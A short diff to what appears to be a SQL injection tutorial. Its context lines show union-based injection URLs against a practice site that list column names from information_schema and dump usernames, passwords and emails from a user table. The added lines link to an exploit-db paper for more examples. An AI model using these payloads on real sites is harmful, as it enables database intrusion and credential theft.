@@ -32,3 +32,7 @@ http://hackme.dev/?id=1 union all select 1,column_name,3,4,5,6 from information_
 6. now select * from user table
 
 http://hackme.dev/?id=1 union all select 1,username,password,email,5,6 from user
+
+
+more examples here:
+http://www.exploit-db.com/papers/13045/
